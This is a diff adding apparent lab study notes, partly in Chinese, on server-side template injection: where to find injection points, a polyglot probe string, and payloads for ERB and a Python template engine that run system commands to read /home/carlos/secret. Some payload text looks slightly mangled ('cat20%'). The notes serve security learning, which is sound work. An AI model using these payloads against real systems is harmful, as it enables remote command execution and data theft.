@@ -1,4 +1,19 @@
 1. Server-side template injection
-常见注入点:
-常见检测方法:
+常见注入点: 
+ a. View more details about the first product
+ b. "My account" page里面可以选择firstname/fullname，结果要在提交comment的时候才能看出来。
+ 
+常见特征:
+If you see something like 'user.firstname', then you should test for SSTI. 
+ 
+ 
+常见检测方法: 
+输入: ${{<%[%'"}}%\ 看看这些符号有哪些是变化
+
+
 常见使用payload:
+In the ERB documentation, discover that the syntax <%= someExpression %> is used to evaluate an expression and render the result on the page. 
+From the Ruby documentation, discover the system() method, which can be used to execute arbitrary operating system commands.
+<%= system("cat20%/home/carlos/secret") %>
+blog-post-author-display=user.name}}{%25+import+os+%25}{{os.system('cat20%/home/carlos/secret')  [这里特别要注意闭合user.name}}]
+
